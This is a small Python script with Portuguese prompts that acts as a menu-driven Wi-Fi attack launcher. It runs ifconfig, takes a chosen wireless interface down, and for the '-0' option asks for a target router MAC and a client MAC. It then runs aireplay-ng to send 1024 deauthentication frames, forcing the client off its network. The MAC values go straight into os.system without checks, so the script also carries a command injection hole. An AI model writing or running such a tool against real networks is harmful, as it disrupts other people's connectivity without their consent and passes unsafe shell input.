#!/usr/bin/env python

import sys
import os

def menu_opcoes():
    menu_wireless = open('menu.txt')
    print(menu_wireless.read())  
    opcao = input('')
    if opcao == '1':
        os.system('ifconfig')
    elif opcao == '2':
        sys.exit(1)
menu_opcoes()

def download_interface():
    download_faces = open('interface.txt')
    print(download_faces.read())         
    opcao_interface = input('(+) Interface: ')
    if opcao_interface == '1':
        print('(+) Interface escolhida: (wlan0) Opcao: %s' % opcao_interface)
        os.system('ifconfig wlan0 down ')
    elif opcao_interface == '2':
        print('(+) Interface escolhida: (wlan1) Opcao: %s' % opcao_interface)
        os.system('ifconfig wlan1 down')
    elif opcao_interface == '3':
        print('(+) Interface escolhida: (wlp3s0) Opcao: %s' % opcao_interface)
        os.system('ifconfig wlp3s0 down')
    elif opcao_interface == '4':
        print('(+) Interface escolhida: (wlp0s20u1) Opcao: %s' % opcao_interface)
        os.system('ifconfig wlp0s20u1 down')
download_interface()

def tipo_attack():
    opcao_attack = open('tipo_attacks.txt')
    print(opcao_attack.read())
    opcao_escolhida = input('>>> ')
    if opcao_escolhida == '-0':
        mac_alvo = str(input('Digite o MAC Router Destino: Exemplo: 54B80AF33FC3 >>>  '))
        mac_usuario = str(input('Digite o MAC Cliente Router Destino: Exemplo: B85A73AC60CC >>>  '))
        os.system('aireplay-ng -0 1024 -a ' +mac_alvo+ ' -c ' +mac_usuario+ ' mon0')
tipo_attack()
